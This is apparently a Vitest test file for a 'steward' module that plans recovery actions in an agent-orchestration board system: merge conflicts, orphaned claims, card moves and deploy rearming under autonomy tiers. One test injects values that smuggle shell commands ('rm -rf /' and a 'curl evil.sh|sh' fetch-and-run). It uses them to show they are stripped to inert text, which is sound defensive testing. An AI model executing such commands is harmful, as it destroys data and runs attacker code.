import { describe, expect, it, vi } from "vitest";
import {
  CLAIM_NOTICE_WINDOW_MS,
  STEWARD_RETRY_CAP,
  classifyConflictScope,
  conflictQuestionText,
  conflictedFilesFromDetail,
  planDeployRecoveredRearm,
  planExpiringClaimNotice,
  planGateSatisfied,
  planNoopRearm,
  planOrphanClaim,
  planParkedConflict,
  runStewardPass,
  type StewardEntry,
  type StewardPorts,
} from "./steward";
import { tierMatrix, tierMode, type CopilotTier } from "./tier";
import type { CardClaim } from "@/lib/storymap/runner/claims";
import type { BoardConfig, Card, OrchestratorPolicy } from "@/lib/storymap/types";

// The THREE tiers, built from tier.ts's own projection rather than hand-written matrices — so a change to what
// a tier means can never leave these tests asserting a tier that no longer exists (acceptance 4's whole point
// is that the playbooks track the REAL matrix, per call).
function policyFor(tier: CopilotTier): OrchestratorPolicy | null {
  const mode = tierMode(tier);
  if (tier === "chat") return { mode };
  return { mode, riskMatrix: tierMatrix(tier) };
}

const AUTONOMO = policyFor("autonomo");
const COPILOTO = policyFor("copiloto");
const STANDBY = policyFor("chat");

const entry = (over: Partial<StewardEntry> = {}): StewardEntry => ({
  runId: "run-1",
  board: "nest",
  cardId: "story-1",
  status: "conflict",
  ...over,
});

describe("classifyConflictScope — a ÚNICA fronteira (a mesma do split/juiz), nunca uma régua nova", () => {
  it("só board-data ⇒ board-data (merge por elemento do WS-2, nunca o juiz)", () => {
    expect(classifyConflictScope(["storymap/boards/nest/cards/story-1.md"])).toBe("board-data");
  });
  it("só código ⇒ code", () => {
    expect(classifyConflictScope(["packages/storymap-ui/src/lib/a.ts"])).toBe("code");
  });
  it("os dois ⇒ mixed (ninguém resolve metade)", () => {
    expect(classifyConflictScope(["storymap/boards/nest/cards/story-1.md", "packages/x/a.ts"])).toBe("mixed");
  });
  it("nada medido ⇒ empty (não prova nada)", () => {
    expect(classifyConflictScope([])).toBe("empty");
    expect(classifyConflictScope(["  "])).toBe("empty");
  });
});

describe("conflictedFilesFromDetail — lê o git que o train JÁ gravou; fail-closed no desconhecido", () => {
  it("extrai os paths de um conflito de merge 3-way", () => {
    const detail = [
      "Auto-merging packages/storymap-ui/src/a.ts",
      "CONFLICT (content): Merge conflict in packages/storymap-ui/src/a.ts",
      "CONFLICT (content): Merge conflict in storymap/boards/nest/cards/story-1.md",
      "Automatic merge failed; fix conflicts and then commit the result.",
    ].join("\n");
    expect(conflictedFilesFromDetail(detail)).toEqual([
      "packages/storymap-ui/src/a.ts",
      "storymap/boards/nest/cards/story-1.md",
    ]);
  });

  it("extrai os paths de um `git apply` falho (a metade de código do split)", () => {
    const detail = "error: patch failed: packages/storymap-ui/src/lib/b.ts:120\nerror: patch does not apply";
    expect(conflictedFilesFromDetail(detail)).toEqual(["packages/storymap-ui/src/lib/b.ts"]);
  });

  it("mensagem irreconhecível ⇒ ZERO arquivos ⇒ o steward fica de fora (fail-closed)", () => {
    expect(conflictedFilesFromDetail("o git explodiu de um jeito novo")).toEqual([]);
    expect(conflictedFilesFromDetail(undefined)).toEqual([]);
    // e o efeito prático: sem arquivos, o plano é stand-down mesmo em Autônomo.
    expect(planParkedConflict({ entry: entry(), files: [], policy: AUTONOMO }).action).toBe("stand-down");
  });
});

describe("8.1 — playbook do conflito parqueado", () => {
  it("board-data ⇒ devolve ao train (o 3-way por elemento resolve por construção)", () => {
    const plan = planParkedConflict({ entry: entry(), files: ["storymap/boards/nest/cards/story-1.md"], policy: AUTONOMO });
    expect(plan.action).toBe("retry");
    expect(plan.scope).toBe("board-data");
  });

  it("código virgem ⇒ devolve ao train p/ subir a escada (o steward NÃO julga: o train julga)", () => {
    const plan = planParkedConflict({ entry: entry(), files: ["packages/x/a.ts"], policy: AUTONOMO });
    expect(plan.action).toBe("retry");
    expect(plan.scope).toBe("code");
  });

  it("misto ⇒ escala (nenhuma das metades resolve sozinha)", () => {
    const plan = planParkedConflict({
      entry: entry(),
      files: ["packages/x/a.ts", "storymap/boards/nest/cards/story-1.md"],
      policy: AUTONOMO,
    });
    expect(plan.action).toBe("escalate");
    expect(plan.scope).toBe("mixed");
  });

  it("a escada JÁ julgou este texto (semanticAttempts>0) ⇒ escala, nunca um 2º julgamento (WS-10 inv. 3)", () => {
    const plan = planParkedConflict({
      entry: entry({ semanticAttempts: 1 }),
      files: ["packages/x/a.ts"],
      policy: AUTONOMO,
    });
    expect(plan.action).toBe("escalate");
  });

  it("LOOP-GUARD: já devolvi uma vez e parqueou de novo ⇒ escala (só re-tento com base nova)", () => {
    const plan = planParkedConflict({
      entry: entry({ stewardAttempts: STEWARD_RETRY_CAP }),
      files: ["storymap/boards/nest/cards/story-1.md"],
      policy: AUTONOMO,
    });
    expect(plan.action).toBe("escalate");
    expect(plan.reason).toMatch(/base nova/);
  });

  it("D3 — conflito de sessão VIVA nunca é do steward", () => {
    const plan = planParkedConflict({ entry: entry({ kind: "session" }), files: ["packages/x/a.ts"], policy: AUTONOMO });
    expect(plan.action).toBe("stand-down");
  });

  it("a escalação CARREGA a análise por hunk — o humano decide 1 hunk digerido, não um diff cru", () => {
    const e = entry({
      resolutionAnalysis: {
        detail: "degrau 2: 1/2 hunk(s) SUBSTANTIVO(s)",
        outcome: "escalated-substantive",
        hunks: [
          { file: "a.ts", hunk: "…", verdict: "cosmetic", rationale: "só comentário" },
          { file: "b.ts", hunk: "…", verdict: "substantive", rationale: "muda o retorno da função" },
        ],
      },
    });
    const text = conflictQuestionText(e, planParkedConflict({ entry: e, files: ["a.ts", "b.ts"], policy: AUTONOMO }));
    expect(text).toContain("substantive");
    expect(text).toContain("muda o retorno da função");
    expect(text).toContain("escalated-substantive");
  });
});

describe("8.2 — claims e sessões órfãs", () => {
  const dead = (over: Partial<CardClaim> = {}): CardClaim => ({
    board: "nest",
    cardId: "story-1",
    actor: "session:agent-7",
    kind: "implement",
    scope: "code",
    acquiredAt: new Date(0).toISOString(),
    expiresAt: new Date(0).toISOString(),
    heartbeatAt: new Date(0).toISOString(),
    released: "session-died",
    releasedAt: new Date(0).toISOString(),
    ...over,
  });

  it("morreu MAS o delta aterrissou ⇒ fecha o ciclo, com a prova (zero re-implementação)", () => {
    const plan = planOrphanClaim({
      claim: dead(),
      landed: { verdict: "landed", detail: "pós-imagem idêntica em main" },
      policy: AUTONOMO,
    });
    expect(plan.action).toBe("close-cycle");
    if (plan.action === "close-cycle") expect(plan.proof).toEqual({ kind: "delta-landed", detail: "pós-imagem idêntica em main" });
  });

  it("morreu e NÃO aterrissou ⇒ redrive MECÂNICO sobre o branch preservado (NUNCA descartar)", () => {
    const plan = planOrphanClaim({ claim: dead(), landed: { verdict: "absent", detail: "não está em main" }, policy: AUTONOMO });
    expect(plan.action).toBe("offer-redrive");
    // o tipo não tem "discard": o branch NÃO é descartável nem em teoria (D5).
    expect(JSON.stringify(plan)).not.toMatch(/discard|delete|descartar o branch/);
  });

  it("`partial`/`unknown` NUNCA fecham ciclo — só `landed` autoriza agir (contrato de assimetria)", () => {
    for (const verdict of ["partial", "unknown", "absent"] as const) {
      const plan = planOrphanClaim({ claim: dead(), landed: { verdict, detail: "x" }, policy: AUTONOMO });
      expect(plan.action).not.toBe("close-cycle");
    }
  });

  it("um claim liberado por EXPIRY (não por morte) não é trabalho do steward", () => {
    const plan = planOrphanClaim({ claim: dead({ released: "expired" }), landed: null, policy: AUTONOMO });
    expect(plan.action).toBe("stand-down");
  });

  it("claim vivo perto de vencer + sessão viva ⇒ avisa ANTES de o card voltar p/ a fila", () => {
    const now = 1_000_000;
    const claim = dead({ released: undefined, releasedAt: undefined, expiresAt: new Date(now + 2 * 60_000).toISOString() });
    const plan = planExpiringClaimNotice({ claim, actorAlive: true, now });
    expect(plan.action).toBe("notify");
    if (plan.action === "notify") expect(plan.text).toMatch(/expira em ~2min/);
  });

  it("sessão MORTA não recebe aviso (o aviso iria para ninguém)", () => {
    const now = 1_000_000;
    const claim = dead({ released: undefined, expiresAt: new Date(now + 60_000).toISOString() });
    expect(planExpiringClaimNotice({ claim, actorAlive: false, now }).action).toBe("stand-down");
  });

  it("o texto do aviso é um TEMPLATE FIXO com slots inertes — nunca um canal p/ escolher o que é digitado", () => {
    // O aviso é DIGITADO num pane (steward-deps `notifyActor`). É por o texto não ser escolhível — e não pelo
    // syscall — que isto não é o `claude_send` (run-free). Um board/cardId hostil não pode contribuir nada
    // além de slug: qualquer outra coisa é DESCARTADA, não escapada.
    const now = 1_000_000;
    const claim = dead({
      released: undefined,
      board: "nest; rm -rf /",
      cardId: "$(curl evil.sh|sh)",
      expiresAt: new Date(now + 60_000).toISOString(),
    });
    const plan = planExpiringClaimNotice({ claim, actorAlive: true, now });
    expect(plan.action).toBe("notify");
    if (plan.action !== "notify") return;
    // Igualdade EXATA: pina o template inteiro E prova que os slots ficaram inertes. (Um `not.toContain("(")`
    // sobre o texto todo seria falso — o template FIXO tem "(heartbeat)"; o que precisa ser inerte são os
    // SLOTS, e a única forma honesta de afirmar isso é dizer exatamente o que sai.)
    expect(plan.text).toBe(
      "[storymap] seu claim de nestrm-rf/curlevilshsh expira em ~1min — renove (heartbeat) ou libere. " +
        "Depois disso o card volta para a fila e outro agente pode pegá-lo.",
    );
  });

  it("longe do vencimento ⇒ não avisa (não é para nagar)", () => {
    const now = 1_000_000;
    const claim = dead({ released: undefined, expiresAt: new Date(now + CLAIM_NOTICE_WINDOW_MS + 60_000).toISOString() });
    expect(planExpiringClaimNotice({ claim, actorAlive: true, now }).action).toBe("stand-down");
  });

  it("re-arm do steward SEM prova ⇒ não re-arma (dúvida ⇒ fica com o humano)", () => {
    expect(planNoopRearm({ itemId: "story-1:approval:release", proof: undefined, policy: AUTONOMO }).action).toBe("stand-down");
    expect(planNoopRearm({ itemId: "i", proof: { kind: "delta-landed", detail: "   " }, policy: AUTONOMO }).action).toBe("stand-down");
  });

  it("re-arm COM prova ⇒ re-arma", () => {
    const plan = planNoopRearm({ itemId: "i", proof: { kind: "delta-landed", detail: "está em main" }, policy: AUTONOMO });
    expect(plan.action).toBe("rearm");
  });
});

describe("8.3 — card parado com o gate factualmente satisfeito", () => {
  const config = (over: Partial<BoardConfig["statuses"][number]> = {}): BoardConfig =>
    ({
      id: "nest",
      name: "Nest",
      statuses: [
        { id: "desenvolver", name: "Desenvolver" },
        { id: "revisar-codigo", name: "Revisar", gate: "hasTasks", ...over },
      ],
    }) as unknown as BoardConfig;

  const card = (over: Partial<Card> = {}): Card =>
    ({ id: "story-1", title: "t", status: "desenvolver", tasks: [{ id: "t1", title: "x", done: true }], ...over }) as unknown as Card;

  it("gate passa + coluna manual ⇒ move (pelo move_card, que revalida o gate)", () => {
    const plan = planGateSatisfied({
      card: card(),
      from: "desenvolver",
      to: "revisar-codigo",
      config: config(),
      policy: AUTONOMO,
      claimedByOther: false,
    });
    expect(plan.action).toBe("move");
    if (plan.action === "move") expect(plan.riskClass).toBe("write-board");
  });

  it("gate NÃO passa ⇒ stand-down — destravar é satisfazer o gate, NUNCA contorná-lo", () => {
    const plan = planGateSatisfied({
      card: card({ tasks: [] }),
      from: "desenvolver",
      to: "revisar-codigo",
      config: config(),
      policy: AUTONOMO,
      claimedByOther: false,
    });
    expect(plan.action).toBe("stand-down");
    expect(plan.reason).toMatch(/gate/i);
  });

  it("coluna-alvo SEM gate ⇒ stand-down (avançar por avançar é da cascata)", () => {
    const noGate = { ...config() };
    noGate.statuses = [{ id: "desenvolver", name: "D" }, { id: "revisar-codigo", name: "R" }] as BoardConfig["statuses"];
    expect(planGateSatisfied({ card: card(), from: "desenvolver", to: "revisar-codigo", config: noGate, policy: AUTONOMO, claimedByOther: false }).action).toBe("stand-down");
  });

  it("outro ator tem o claim ⇒ stand-down (não mexe em trabalho vivo alheio)", () => {
    expect(
      planGateSatisfied({ card: card(), from: "desenvolver", to: "revisar-codigo", config: config(), policy: AUTONOMO, claimedByOther: true }).action,
    ).toBe("stand-down");
  });

  it("coluna com onEnter (deploy) resolve como `deploy`: Autônomo move, COPILOTO PARA — o bit que separa os dois", () => {
    const releaseCol = config({ id: "revisar-codigo", name: "Publicar", onEnter: "deploy-board" });
    const args = { card: card(), from: "desenvolver", to: "revisar-codigo", config: releaseCol, claimedByOther: false } as const;

    const auto = planGateSatisfied({ ...args, policy: AUTONOMO });
    expect(auto.action).toBe("move");
    if (auto.action === "move") expect(auto.riskClass).toBe("deploy");

    const cop = planGateSatisfied({ ...args, policy: COPILOTO });
    expect(cop.action).toBe("stand-down");
    expect(cop.reason).toMatch(/deploy/);
  });
});

// ── 8.4 — o produtor de `deploy-recovered` ──────────────────────────────────────────────────────────────
describe("planDeployRecoveredRearm — BORDA (false → true), nunca NÍVEL", () => {
  const proven = { deployProven: true, detail: "alvos e superfície carregam 47a8edd9c" };
  const notProven = { deployProven: false, detail: "a superfície serve 033ee72e6, que NÃO o contém" };
  const base = { itemId: "story-1:approval:release", cardId: "story-1", stewardRearmed: false } as const;

  it("baseline false + medição true ⇒ rearm com kind `deploy-recovered` e o detail da medição", () => {
    const p = planDeployRecoveredRearm({ ...base, observedDeployProven: false, measured: proven });
    expect(p.action).toBe("rearm");
    if (p.action === "rearm") expect(p.proof).toEqual({ kind: "deploy-recovered", detail: proven.detail });
  });

  it("baseline TRUE + medição true ⇒ stand-down — o teste que FALSIFICA a proposta de nível", () => {
    // Medido no incidente: "a face carrega o release" já era verdadeiro nas 3 desistências. Um predicado que
    // era verdadeiro quando o tick desistiu não explica por que tentar de novo daria certo.
    const p = planDeployRecoveredRearm({ ...base, observedDeployProven: true, measured: proven });
    expect(p.action).toBe("stand-down");
    expect(p.reason).toMatch(/N[ÍI]VEL|nível/i);
  });

  it("sem baseline ⇒ observe (a primeira observação NUNCA re-arma), carregando o fato a gravar", () => {
    const p = planDeployRecoveredRearm({ ...base, observedDeployProven: null, measured: proven });
    expect(p.action).toBe("observe");
    if (p.action === "observe") expect(p.deployProven).toBe(true);
  });

  it("medição null (não medi) ⇒ stand-down: dúvida não é evidência, e null jamais vira false", () => {
    expect(planDeployRecoveredRearm({ ...base, observedDeployProven: false, measured: null }).action).toBe("stand-down");
    // …inclusive quando NÃO há baseline: sem medição não há nem o que observar.
    expect(planDeployRecoveredRearm({ ...base, observedDeployProven: null, measured: null }).action).toBe("stand-down");
  });

  it("teto: já re-armado sob a doutrina em vigor ⇒ stand-down MESMO com borda", () => {
    const p = planDeployRecoveredRearm({ ...base, stewardRearmed: true, observedDeployProven: false, measured: proven });
    expect(p.action).toBe("stand-down");
  });

  it("medição segue false ⇒ stand-down (o retry falharia igual)", () => {
    expect(planDeployRecoveredRearm({ ...base, observedDeployProven: false, measured: notProven }).action).toBe("stand-down");
  });

  it("item de board (cardId vazio) ⇒ stand-down: não há card cujo deploy medir", () => {
    expect(planDeployRecoveredRearm({ ...base, cardId: "", observedDeployProven: false, measured: proven }).action).toBe("stand-down");
  });
});

// ── ACEITE 4 — o critério que governa tudo acima ────────────────────────────────────────────────────────
describe("aceite 4 — em Copiloto/Chat NADA roda além do que a matriz permite hoje", () => {
  it("STANDBY (mode off): nenhum playbook age, em nenhuma situação", () => {
    expect(planParkedConflict({ entry: entry(), files: ["storymap/boards/nest/cards/story-1.md"], policy: STANDBY }).action).toBe("stand-down");
    expect(planParkedConflict({ entry: entry(), files: ["packages/x/a.ts"], policy: STANDBY }).action).toBe("stand-down");
    expect(
      planOrphanClaim({
        claim: { board: "nest", cardId: "c", actor: "session:a", kind: "implement", scope: "code", acquiredAt: "", expiresAt: "", heartbeatAt: "", released: "session-died" },
        landed: { verdict: "landed", detail: "x" },
        policy: STANDBY,
      }).action,
    ).toBe("escalate");
    expect(planNoopRearm({ itemId: "i", proof: { kind: "delta-landed", detail: "x" }, policy: STANDBY }).action).toBe("stand-down");
  });

  it("8.4 sob STANDBY: a BORDA existe, o plano diz `rearm`, e a COMPOSIÇÃO com planNoopRearm para", () => {
    // 8.4 não checa a matriz de propósito (uma 2ª cópia da régua é o ruler duplicado do D15) — quem a checa é
    // planNoopRearm. Este teste prova que a composição, não o predicado, é o portão.
    const plan = planDeployRecoveredRearm({
      itemId: "story-1:approval:release",
      cardId: "story-1",
      observedDeployProven: false,
      stewardRearmed: false,
      measured: { deployProven: true, detail: "alvos e superfície carregam 47a8edd9c" },
    });
    expect(plan.action).toBe("rearm");
    if (plan.action !== "rearm") return;
    expect(planNoopRearm({ itemId: "story-1:approval:release", proof: plan.proof, policy: STANDBY }).action).toBe("stand-down");
    // …e em Autônomo a mesma composição libera (senão o teste acima provaria só que nada funciona).
    expect(planNoopRearm({ itemId: "story-1:approval:release", proof: plan.proof, policy: AUTONOMO }).action).toBe("rearm");
  });

  it("COPILOTO: `merge-resolve` é auto na matriz base ⇒ 8.1 roda…", () => {
    expect(planParkedConflict({ entry: entry(), files: ["packages/x/a.ts"], policy: COPILOTO }).action).toBe("retry");
  });

  it("…mas o que a matriz do Copiloto NÃO dá (deploy) continua parando nele — não é o tier que decide, é a matriz", () => {
    // Um board hipotético que declara merge-resolve: ask (o default) NÃO destrava o train nem em autonomous.
    const askMerge: OrchestratorPolicy = { mode: "autonomous", riskMatrix: { "merge-resolve": "ask" } };
    expect(planParkedConflict({ entry: entry(), files: ["packages/x/a.ts"], policy: askMerge }).action).toBe("stand-down");
  });

  it("matriz ausente ⇒ os defaults conservadores mandam (nada é auto por omissão)", () => {
    const bare: OrchestratorPolicy = { mode: "autonomous" };
    expect(planParkedConflict({ entry: entry(), files: ["packages/x/a.ts"], policy: bare }).action).toBe("stand-down");
    expect(planParkedConflict({ entry: entry(), files: ["packages/x/a.ts"], policy: null }).action).toBe("stand-down");
  });
});

// ── O executor ─────────────────────────────────────────────────────────────────────────────────────────
function makePorts(over: Partial<StewardPorts> = {}): StewardPorts {
  return {
    board: "nest",
    policy: async () => AUTONOMO,
    config: async () => ({ id: "nest", name: "Nest", statuses: [] }) as unknown as BoardConfig,
    parkedEntries: async () => [],
    conflictFiles: async () => [],
    retryEntry: async () => ({ ok: true, detail: "ok" }),
    releasedClaims: async () => [],
    liveClaims: async () => [],
    actorAlive: async () => false,
    notifyActor: async () => true,
    deltaLandedForCard: async () => null,
    backoffItemsFor: async () => [],
    // Defaults INERTES para as portas de 8.4: sem elas todo teste existente do executor quebraria por uma
    // porta ausente, e um default que MEDE (em vez de "não há item em backoff") faria 8.4 agir de carona em
    // testes que nada têm a ver com ele.
    rearm: async () => ({ ok: true }),
    backoffItems: async () => [],
    deployRecoveryFor: async () => null,
    recordObservedFact: async () => {},
    gateCandidates: async () => [],
    claimedCardIds: async () => new Set<string>(),
    moveCard: async () => ({ ok: true }),
    askQuestion: async () => {},
    diary: async () => {},
    ...over,
  };
}

describe("runStewardPass — o executor", () => {
  it("ACEITE 1: entry de board-data parqueada ⇒ devolvida ao train sozinha, com diário, zero humano", async () => {
    const retryEntry = vi.fn(async () => ({ ok: true, detail: "devolvida" }));
    const diary = vi.fn(async () => {});
    const askQuestion = vi.fn(async () => {});
    const report = await runStewardPass(
      makePorts({
        parkedEntries: async () => [entry({ conflictDetail: "CONFLICT (content): Merge conflict in storymap/boards/nest/cards/story-1.md" })],
        conflictFiles: async (e) => conflictedFilesFromDetail(e.conflictDetail),
        retryEntry,
        diary,
        askQuestion,
      }),
    );
    expect(report.retried).toEqual(["run-1"]);
    expect(retryEntry).toHaveBeenCalledOnce();
    expect(askQuestion).not.toHaveBeenCalled(); // zero intervenção humana
    expect(diary).toHaveBeenCalledWith(expect.objectContaining({ kind: "acted" }));
  });

  it("substantivo ⇒ pergunta COM a análise e SILÊNCIO (nenhuma devolução ao train)", async () => {
    const retryEntry = vi.fn(async () => ({ ok: true, detail: "" }));
    const askQuestion = vi.fn(async () => {});
    const report = await runStewardPass(
      makePorts({
        parkedEntries: async () => [
          entry({
            semanticAttempts: 1,
            resolutionAnalysis: { detail: "1 hunk substantivo", outcome: "escalated-substantive", hunks: [{ file: "a.ts", hunk: "…", verdict: "substantive", rationale: "muda comportamento" }] },
          }),
        ],
        conflictFiles: async () => ["packages/x/a.ts"],
        retryEntry,
        askQuestion,
      }),
    );
    expect(report.escalated).toEqual(["run-1"]);
    expect(retryEntry).not.toHaveBeenCalled();
    expect(askQuestion).toHaveBeenCalledWith("story-1", expect.stringContaining("muda comportamento"));
  });

  it("entry card-less (D2): escala sem inventar um card p/ pendurar a pergunta", async () => {
    const askQuestion = vi.fn(async () => {});
    const report = await runStewardPass(
      makePorts({
        parkedEntries: async () => [entry({ cardId: undefined, kind: "run", semanticAttempts: 1 })],
        conflictFiles: async () => ["packages/x/a.ts"],
        askQuestion,
      }),
    );
    expect(report.escalated).toEqual(["run-1"]);
    expect(askQuestion).not.toHaveBeenCalled();
  });

  it("sessão morta + delta aterrissado ⇒ fecha o ciclo E re-arma o backoff do item com a MESMA prova", async () => {
    const rearm = vi.fn(async () => ({ ok: true }));
    const report = await runStewardPass(
      makePorts({
        releasedClaims: async () => [
          { board: "nest", cardId: "story-1", actor: "session:a", kind: "implement", scope: "code", acquiredAt: "", expiresAt: "", heartbeatAt: "", released: "session-died" },
        ],
        deltaLandedForCard: async () => ({ verdict: "landed", detail: "está em main" }),
        backoffItemsFor: async () => ["story-1:approval:release"],
        rearm,
      }),
    );
    expect(report.cyclesClosed).toEqual(["story-1"]);
    expect(report.rearmed).toEqual(["story-1:approval:release"]);
    expect(rearm).toHaveBeenCalledWith("story-1:approval:release", { kind: "delta-landed", detail: "está em main" });
  });

  it("uma porta que explode não derruba o passe nem cala os outros playbooks", async () => {
    const moveCard = vi.fn(async () => ({ ok: true }));
    const report = await runStewardPass(
      makePorts({
        parkedEntries: async () => {
          throw new Error("train indisponível");
        },
        gateCandidates: async () => [
          {
            card: { id: "story-9", title: "t", status: "a", tasks: [{ id: "t1", title: "x", done: true }] } as unknown as Card,
            from: "a",
            to: "b",
          },
        ],
        config: async () =>
          ({ id: "nest", name: "N", statuses: [{ id: "a", name: "A" }, { id: "b", name: "B", gate: "hasTasks" }] }) as unknown as BoardConfig,
        moveCard,
      }),
    );
    expect(report.errors[0]).toMatch(/8\.1: train indisponível/);
    expect(report.moved).toEqual(["story-9"]); // 8.3 seguiu normalmente
  });

  it("move_card recusa ⇒ o steward REPORTA, nunca contorna", async () => {
    const report = await runStewardPass(
      makePorts({
        gateCandidates: async () => [
          { card: { id: "story-9", title: "t", status: "a", tasks: [{ id: "t1", title: "x", done: true }] } as unknown as Card, from: "a", to: "b" },
        ],
        config: async () =>
          ({ id: "nest", name: "N", statuses: [{ id: "a", name: "A" }, { id: "b", name: "B", gate: "hasTasks" }] }) as unknown as BoardConfig,
        moveCard: async () => ({ ok: false, error: "gate hasTasks não passa" }),
      }),
    );
    expect(report.moved).toEqual([]);
    expect(report.errors[0]).toMatch(/gate hasTasks não passa/);
  });

  // ── 8.4 no executor ────────────────────────────────────────────────────────────────────────────────────
  it("item em backoff com BORDA ⇒ re-armado com a prova `deploy-recovered` medida", async () => {
    const rearm = vi.fn(async () => ({ ok: true }));
    const recordObservedFact = vi.fn(async () => {});
    const report = await runStewardPass(
      makePorts({
        backoffItems: async () => [
          { itemId: "story-1:approval:release", cardId: "story-1", observedDeployProven: false, stewardRearmed: false },
        ],
        deployRecoveryFor: async () => ({ deployProven: true, detail: "alvos e superfície carregam 47a8edd9c" }),
        rearm,
        recordObservedFact,
      }),
    );
    expect(report.rearmed).toEqual(["story-1:approval:release"]);
    expect(rearm).toHaveBeenCalledWith("story-1:approval:release", {
      kind: "deploy-recovered",
      detail: "alvos e superfície carregam 47a8edd9c",
    });
    expect(recordObservedFact).not.toHaveBeenCalled(); // já havia baseline — nada a observar
  });

  it("sem baseline ⇒ 8.4 só GRAVA o fato (nenhum re-arm) — a primeira observação nunca age", async () => {
    const rearm = vi.fn(async () => ({ ok: true }));
    const recordObservedFact = vi.fn(async () => {});
    const report = await runStewardPass(
      makePorts({
        backoffItems: async () => [
          { itemId: "story-1:approval:release", cardId: "story-1", observedDeployProven: null, stewardRearmed: false },
        ],
        deployRecoveryFor: async () => ({ deployProven: true, detail: "tudo no ar" }),
        rearm,
        recordObservedFact,
      }),
    );
    expect(report.rearmed).toEqual([]);
    expect(rearm).not.toHaveBeenCalled();
    expect(recordObservedFact).toHaveBeenCalledWith("story-1:approval:release", true);
  });

  it("item JÁ re-armado por 8.2 no mesmo passe não é re-armado de novo por 8.4", async () => {
    const rearm = vi.fn(async () => ({ ok: true }));
    const deployRecoveryFor = vi.fn(async () => ({ deployProven: true, detail: "no ar" }));
    const report = await runStewardPass(
      makePorts({
        // 8.2: sessão morta com delta aterrissado ⇒ re-arma story-1:approval:release
        releasedClaims: async () => [
          { board: "nest", cardId: "story-1", actor: "session:a", kind: "implement", scope: "code", acquiredAt: "", expiresAt: "", heartbeatAt: "", released: "session-died" },
        ],
        deltaLandedForCard: async () => ({ verdict: "landed", detail: "está em main" }),
        backoffItemsFor: async () => ["story-1:approval:release"],
        // 8.4 veria o MESMO item com uma borda perfeita — e deve pulá-lo.
        backoffItems: async () => [
          { itemId: "story-1:approval:release", cardId: "story-1", observedDeployProven: false, stewardRearmed: false },
        ],
        deployRecoveryFor,
        rearm,
      }),
    );
    expect(report.rearmed).toEqual(["story-1:approval:release"]); // UMA vez, não duas
    expect(rearm).toHaveBeenCalledTimes(1);
    expect(rearm).toHaveBeenCalledWith("story-1:approval:release", { kind: "delta-landed", detail: "está em main" });
    expect(deployRecoveryFor).not.toHaveBeenCalled(); // nem gasta a medição
  });

  it("uma medição por CARD, compartilhada pelos itens dele (granularidade de card, como o bump)", async () => {
    const deployRecoveryFor = vi.fn(async () => ({ deployProven: true, detail: "no ar" }));
    const report = await runStewardPass(
      makePorts({
        backoffItems: async () => [
          { itemId: "story-1:approval:release", cardId: "story-1", observedDeployProven: false, stewardRearmed: false },
          { itemId: "story-1:deploy-failed", cardId: "story-1", observedDeployProven: false, stewardRearmed: false },
        ],
        deployRecoveryFor,
      }),
    );
    expect(report.rearmed).toEqual(["story-1:approval:release", "story-1:deploy-failed"]);
    expect(deployRecoveryFor).toHaveBeenCalledTimes(1);
  });

  it("`rearm` devolvendo {ok:false} NÃO entra em report.rearmed (a porta engolia a decisão)", async () => {
    const report = await runStewardPass(
      makePorts({
        backoffItems: async () => [
          { itemId: "story-1:approval:release", cardId: "story-1", observedDeployProven: false, stewardRearmed: false },
        ],
        deployRecoveryFor: async () => ({ deployProven: true, detail: "no ar" }),
        rearm: async () => ({ ok: false, error: "prova recusada" }),
      }),
    );
    expect(report.rearmed).toEqual([]);
    expect(report.errors[0]).toMatch(/prova recusada/);
  });

  it("medição null (não medi) ⇒ 8.4 fica em silêncio: nem re-arma, nem grava baseline", async () => {
    const rearm = vi.fn(async () => ({ ok: true }));
    const recordObservedFact = vi.fn(async () => {});
    const report = await runStewardPass(
      makePorts({
        backoffItems: async () => [
          { itemId: "story-1:approval:release", cardId: "story-1", observedDeployProven: null, stewardRearmed: false },
        ],
        deployRecoveryFor: async () => null,
        rearm,
        recordObservedFact,
      }),
    );
    expect(report.rearmed).toEqual([]);
    expect(rearm).not.toHaveBeenCalled();
    expect(recordObservedFact).not.toHaveBeenCalled();
    expect(report.standDowns).toBeGreaterThan(0);
  });

  it("uma porta de 8.4 que explode vira erro `8.4:` e não derruba 8.3", async () => {
    const report = await runStewardPass(
      makePorts({
        backoffItems: async () => {
          throw new Error("estado ilegível");
        },
        gateCandidates: async () => [
          { card: { id: "story-9", title: "t", status: "a", tasks: [{ id: "t1", title: "x", done: true }] } as unknown as Card, from: "a", to: "b" },
        ],
        config: async () =>
          ({ id: "nest", name: "N", statuses: [{ id: "a", name: "A" }, { id: "b", name: "B", gate: "hasTasks" }] }) as unknown as BoardConfig,
      }),
    );
    expect(report.errors[0]).toMatch(/8\.4: estado ilegível/);
    expect(report.moved).toEqual(["story-9"]);
  });
});
